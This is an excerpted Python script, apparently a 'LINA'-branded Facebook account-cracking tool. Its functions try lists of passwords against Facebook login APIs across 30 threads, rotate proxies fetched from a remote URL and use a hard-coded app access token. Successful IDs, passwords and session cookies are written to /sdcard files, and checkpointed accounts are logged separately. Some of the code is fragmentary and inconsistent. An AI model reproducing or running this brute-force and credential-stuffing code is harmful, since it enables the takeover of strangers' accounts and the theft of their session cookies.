...
os.system('xdg-open https://www.facebook.com/profile.php?id=100070021063560')

try:
    prox= requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\033[1;35mCHECQUEEN  FOR UPDATE...')
...
logo=(f"""{WHITE}
           ...
           \033[1;35m.%%%%%%..%%%%%%..%%..%%..%%..%%.
           \033[1;31m................................
    \33[47;1m\33[1;91m[ PRO ]   \33[00;1m\33[41;1m   \33[1;97m[ POWERED BY LINA ]   \33[00;1m\33[47;1m   \33[1;91m[ PRO ]\33[00;1m
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{WHITE}[\033[1;33m⍣\033[1;33m{WHITE}\033[1;34m]{WHITE} OWNER        :  LiNa Khan
[\033[1;33m⍣\033[1;33m{WHITE}]{WHITE} FaceBook     :  LiNa QuEen 
...
def pak():
		...
		with tred(max_workers=30) as LINA:	
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					LINA.submit(lina1,ids,passlist)
				if mthd in ['2','02']:
					LINA.submit(lina2,ids,passlist)
				if mthd in ['3','03']:
					LINA.submit(lina3,ids,passlist)
				if mthd in ['4','04']:
					LINA.submit(lina4,ids,passlist)
				if mthd in ['5','05']:
					LINA.submit(lina5,ids,passlist)
				if mthd in ['6','06']:
					LINA.submit(lina6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [LINA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [LINA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [LINA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/LINA-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/LINA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [LINA-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/LINA-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/LINA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [LINA-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [LINA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/LINA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [LINA-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in LINA:
				...
				print('\r\r\033[1;32m [LINA-OK] %s | %s'%(ids,pas))
				open('/sdcard/LINA-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [LINA-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [LINA-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [LINA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def lina2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [LINA-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/LINA-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [LINA-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/LINA-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def lina4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [LINA-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [LINA-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [LINA-OK] '+uid+' | '+pas)
						open('/sdcard/LINA-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [LINA-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/LINA-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
